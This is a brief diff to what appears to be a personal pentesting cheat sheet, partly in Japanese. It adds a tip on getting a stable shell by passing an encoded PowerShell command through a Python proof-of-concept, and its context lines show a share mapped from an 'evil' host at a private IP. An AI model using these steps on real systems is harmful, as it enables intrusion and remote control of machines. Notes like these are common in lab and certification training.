@@ -343,3 +343,10 @@ wmic os get osarchitecture
 ```
 net use X: \\192.168.45.174\evil
 ```
+
+## foothold to get stabled shell
+
+1. pythonのPOCとかで-cの引数にコマンド渡すとき、これとか割とうごく
+```
+-c powershell.exe -a '-e <base64 command>'
+```
